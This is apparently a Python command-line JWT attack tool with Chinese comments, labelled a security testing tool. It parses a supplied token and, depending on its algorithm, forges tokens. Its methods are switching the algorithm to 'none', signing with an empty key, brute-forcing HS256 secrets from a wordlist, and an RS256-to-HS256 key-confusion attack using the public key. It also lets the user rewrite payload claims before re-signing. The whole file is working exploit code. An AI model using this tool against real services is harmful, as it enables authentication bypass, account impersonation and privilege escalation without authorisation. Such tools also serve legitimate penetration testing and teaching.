#!/usr/bin/env python3

import argparse
import base64
import json
import hmac
import hashlib
import sys
import os

# 尝试导入 PyJWT（用于 RS256 签名）
try:
    import jwt
except ImportError:
    print("[!] 请安装 PyJWT 库以支持 RS256 签名: pip install pyjwt")
    sys.exit(1)

class JWTUtils:
    """JWT 编解码和签名工具类"""

    @staticmethod
    def b64url_decode(data: str) -> bytes:
        """Base64URL 解码（自动处理 padding）"""
        padding = 4 - (len(data) % 4)
        if padding != 4:
            data += '=' * padding
        return base64.urlsafe_b64decode(data)

    @staticmethod
    def b64url_encode(data: bytes) -> str:
        """Base64URL 编码（去除 padding）"""
        return base64.urlsafe_b64encode(data).decode().rstrip('=')

    @staticmethod
    def decode_jwt(jwt_str: str):
        """解析 JWT，返回 header, payload, signature, header_b64, payload_b64, signature_b64"""
        parts = jwt_str.split('.')
        if len(parts) != 3:
            raise ValueError("Invalid JWT format (expected 3 parts)")

        header_b64, payload_b64, signature_b64 = parts
        header = json.loads(JWTUtils.b64url_decode(header_b64))
        payload = json.loads(JWTUtils.b64url_decode(payload_b64))
        signature = JWTUtils.b64url_decode(signature_b64) if signature_b64 else b''
        return header, payload, signature, header_b64, payload_b64, signature_b64

    @staticmethod
    def encode_jwt(header: dict, payload: dict, signature_b64: str = '') -> str:
        """将 header 和 payload 编码为 JWT 字符串，可选签名"""
        header_b64 = JWTUtils.b64url_encode(json.dumps(header, separators=(',', ':')).encode())
        payload_b64 = JWTUtils.b64url_encode(json.dumps(payload, separators=(',', ':')).encode())
        return f"{header_b64}.{payload_b64}.{signature_b64}"

    @staticmethod
    def sign_hs256(header_b64: str, payload_b64: str, key: bytes) -> str:
        """使用 HMAC-SHA256 生成签名（Base64URL）"""
        message = f"{header_b64}.{payload_b64}".encode()
        sig = hmac.new(key, message, hashlib.sha256).digest()
        return JWTUtils.b64url_encode(sig)

    @staticmethod
    def verify_hs256(header_b64: str, payload_b64: str, signature_b64: str, key: bytes) -> bool:
        """验证 HMAC-SHA256 签名"""
        expected = JWTUtils.sign_hs256(header_b64, payload_b64, key)
        return hmac.compare_digest(expected, signature_b64)

    @staticmethod
    def sign_rs256(header: dict, payload: dict, private_key_pem: str) -> str:
        """使用 RS256 签名，返回完整 JWT 字符串"""
        return jwt.encode(payload, private_key_pem, algorithm='RS256', headers=header)

    @staticmethod
    def sign_hs256_with_key(header: dict, payload: dict, key: bytes) -> str:
        """使用 HS256 签名，返回完整 JWT 字符串"""
        header_b64 = JWTUtils.b64url_encode(json.dumps(header, separators=(',', ':')).encode())
        payload_b64 = JWTUtils.b64url_encode(json.dumps(payload, separators=(',', ':')).encode())
        sig_b64 = JWTUtils.sign_hs256(header_b64, payload_b64, key)
        return f"{header_b64}.{payload_b64}.{sig_b64}"

def main():
    # 显示作者信息
    print("----------------------")
    print("Made by @Fa11in9Rain")
    print("\"热爱是所有的答案与理由。\"")
    print("----------------------\n")

    parser = argparse.ArgumentParser(description="JWT 安全测试工具")
    parser.add_argument("-j", "--jwt", required=True, help="JWT 字符串")
    args = parser.parse_args()

    jwt_input = args.jwt.strip()

    try:
        # 解码 JWT
        header, payload, signature, header_b64, payload_b64, signature_b64 = JWTUtils.decode_jwt(jwt_input)
        alg = header.get('alg', '').upper()

        print("[*] 原始 JWT 解析结果：")
        print(f"[+] Header:\n{json.dumps(header, indent=2)}")
        print(f"[+] Payload:\n{json.dumps(payload, indent=2)}")
        print(f"[+] Algorithm: {alg}")
        print()

        # 根据算法进入不同分支
        if alg == 'NONE':
            handle_none(header, payload, header_b64, payload_b64)
        elif alg == 'HS256':
            handle_hs256(header, payload, header_b64, payload_b64, signature_b64, jwt_input)
        elif alg == 'RS256':
            handle_rs256(header, payload, header_b64, payload_b64)
        else:
            print(f"[!] 不支持的算法: {alg}，仅支持 None、HS256、RS256")
            sys.exit(1)

    except Exception as e:
        print(f"[!] 错误: {e}")
        sys.exit(1)

def handle_none(header, payload, header_b64, payload_b64):
    """处理 None 算法"""
    print("[*] 算法为 None，可进行以下操作：")
    print("[1] 修改 Header 内容")
    print("[2] 修改 Payload 内容")
    choice = input("请选择 (1/2): ").strip()

    new_header = header.copy()
    new_payload = payload.copy()

    if choice == '1':
        print("请输入新的 Header (JSON 格式):")
        try:
            new_header_str = input().strip()
            new_header = json.loads(new_header_str)
        except json.JSONDecodeError:
            print("[!] 无效的 JSON，操作取消")
            return
    elif choice == '2':
        print("请输入新的 Payload (JSON 格式):")
        try:
            new_payload_str = input().strip()
            new_payload = json.loads(new_payload_str)
        except json.JSONDecodeError:
            print("[!] 无效的 JSON，操作取消")
            return
    else:
        print("[!] 无效选择")
        return

    # 生成新的 JWT（None 算法签名部分为空）
    new_jwt = JWTUtils.encode_jwt(new_header, new_payload, '')
    print(f"[+] 生成的新 JWT:\n{new_jwt}")

def handle_hs256(header, payload, header_b64, payload_b64, signature_b64, original_jwt):
    """处理 HS256 算法"""
    print("[*] 算法为 HS256，可选择以下攻击方式：")
    print("[1] 置空密钥攻击")
    print("[2] 爆破密钥")
    print("[3] 修改算法为 None")
    print("[4] 导入密钥（从文件读取）")
    choice = input("请选择 (1/2/3/4): ").strip()

    if choice == '1':
        key = b''
        new_sig_b64 = JWTUtils.sign_hs256(header_b64, payload_b64, key)
        new_jwt = f"{header_b64}.{payload_b64}.{new_sig_b64}"
        print(f"[+] 置空密钥攻击成功，新 JWT:\n{new_jwt}")

    elif choice == '2':
        dict_path = input("请输入字典文件路径: ").strip()
        if not os.path.isfile(dict_path):
            print("[!] 文件不存在")
            return

        print("[*] 开始爆破密钥...")
        found_key = None
        with open(dict_path, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                key = line.strip().encode()
                if JWTUtils.verify_hs256(header_b64, payload_b64, signature_b64, key):
                    found_key = key
                    break
        if found_key:
            print(f"[+] 找到密钥: {found_key.decode()}")
            print("[?] 是否修改 Payload 中的参数？(y/n)")
            modify = input().strip().lower()
            if modify == 'y':
                new_payload = modify_payload(payload)
                # 重新编码 Payload
                new_payload_b64 = JWTUtils.b64url_encode(json.dumps(new_payload, separators=(',', ':')).encode())
                new_sig_b64 = JWTUtils.sign_hs256(header_b64, new_payload_b64, found_key)
                new_jwt = f"{header_b64}.{new_payload_b64}.{new_sig_b64}"
                print(f"[+] 新 JWT:\n{new_jwt}")
            else:
                new_sig_b64 = JWTUtils.sign_hs256(header_b64, payload_b64, found_key)
                new_jwt = f"{header_b64}.{payload_b64}.{new_sig_b64}"
                print(f"[+] 使用密钥重新签名成功，新 JWT:\n{new_jwt}")
        else:
            print("[!] 未找到正确密钥")

    elif choice == '3':
        new_header = header.copy()
        new_header['alg'] = 'none'
        new_jwt = JWTUtils.encode_jwt(new_header, payload, '')
        print(f"[+] 算法改为 None，新 JWT:\n{new_jwt}")

    elif choice == '4':
        key_file = input("请输入密钥文件路径: ").strip()
        if not os.path.isfile(key_file):
            print("[!] 文件不存在")
            return
        try:
            with open(key_file, 'r', encoding='utf-8') as f:
                key = f.read().strip().encode()
            if not key:
                print("[!] 密钥文件为空")
                return
        except Exception as e:
            print(f"[!] 读取密钥文件失败: {e}")
            return
        new_sig_b64 = JWTUtils.sign_hs256(header_b64, payload_b64, key)
        new_jwt = f"{header_b64}.{payload_b64}.{new_sig_b64}"
        print(f"[+] 使用导入的密钥签名成功，新 JWT:\n{new_jwt}")

    else:
        print("[!] 无效选择")

def handle_rs256(header, payload, header_b64, payload_b64):
    """处理 RS256 算法"""
    print("[*] 算法为 RS256，可选择以下操作：")
    print("[1] 导入私钥 (RS256) 并签名")
    print("[2] 密钥混淆攻击 (HS256 with public key)")
    choice = input("请选择 (1/2): ").strip()

    if choice == '1':
        # 导入私钥，使用 RS256 重新签名
        key_file = input("请输入私钥文件路径 (PEM 格式): ").strip()
        if not os.path.isfile(key_file):
            print("[!] 文件不存在")
            return
        try:
            with open(key_file, 'r', encoding='utf-8') as f:
                private_key = f.read()
        except Exception as e:
            print(f"[!] 读取私钥文件失败: {e}")
            return

        print("[?] 是否修改 Payload 中的参数？(y/n)")
        modify = input().strip().lower()
        if modify == 'y':
            new_payload = modify_payload(payload)
            new_jwt = JWTUtils.sign_rs256(header, new_payload, private_key)
            print(f"[+] 新 JWT (RS256):\n{new_jwt}")
        else:
            new_jwt = JWTUtils.sign_rs256(header, payload, private_key)
            print(f"[+] 新 JWT (RS256):\n{new_jwt}")

    elif choice == '2':
        # 密钥混淆攻击：将算法改为 HS256，使用公钥作为 HMAC 密钥签名
        pubkey_file = input("请输入公钥文件路径 (PEM 格式): ").strip()
        if not os.path.isfile(pubkey_file):
            print("[!] 文件不存在")
            return
        try:
            with open(pubkey_file, 'r', encoding='utf-8') as f:
                public_key = f.read().strip().encode()
        except Exception as e:
            print(f"[!] 读取公钥文件失败: {e}")
            return

        # 修改算法为 HS256
        new_header = header.copy()
        new_header['alg'] = 'HS256'

        print("[?] 是否修改 Payload 中的参数？(y/n)")
        modify = input().strip().lower()
        if modify == 'y':
            new_payload = modify_payload(payload)
            new_jwt = JWTUtils.sign_hs256_with_key(new_header, new_payload, public_key)
            print(f"[+] 新 JWT (HS256 with public key):\n{new_jwt}")
        else:
            new_jwt = JWTUtils.sign_hs256_with_key(new_header, payload, public_key)
            print(f"[+] 新 JWT (HS256 with public key):\n{new_jwt}")

    else:
        print("[!] 无效选择")

def modify_payload(payload):
    """交互式修改 Payload，返回修改后的 Payload"""
    print("当前 Payload:")
    print(json.dumps(payload, indent=2))
    new_payload = payload.copy()
    while True:
        print("请输入要修改的字段名（输入空行结束修改）:")
        field = input().strip()
        if not field:
            break
        if field not in new_payload:
            print(f"[!] 字段 '{field}' 不存在，请重新输入")
            continue
        print(f"当前值: {new_payload[field]}")
        new_value = input("请输入新值: ").strip()
        # 尝试保留原始类型
        if isinstance(new_payload[field], int):
            try:
                new_value = int(new_value)
            except ValueError:
                print("[!] 值无法转换为整数，将保持为字符串")
        elif isinstance(new_payload[field], bool):
            if new_value.lower() in ('true', 'false'):
                new_value = new_value.lower() == 'true'
            else:
                print("[!] 值不是 true/false，将保持为字符串")
        elif isinstance(new_payload[field], float):
            try:
                new_value = float(new_value)
            except ValueError:
                print("[!] 值无法转换为浮点数，将保持为字符串")
        new_payload[field] = new_value
        print(f"[+] 已修改 {field} = {new_value}")
    return new_payload

if __name__ == "__main__":
    main()